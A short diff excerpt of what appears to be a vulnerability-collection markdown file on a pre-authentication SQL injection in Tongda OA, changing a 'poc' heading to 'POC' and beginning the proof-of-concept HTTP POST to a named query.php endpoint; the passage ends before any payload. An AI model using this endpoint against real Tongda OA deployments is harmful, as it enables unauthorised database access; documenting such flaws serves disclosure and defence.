@@ -1,6 +1,6 @@
 ## 通达OA-WHERE_STR存在前台SQL注入漏洞
 
-## poc
+## POC
 ```
 POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
 Host: 
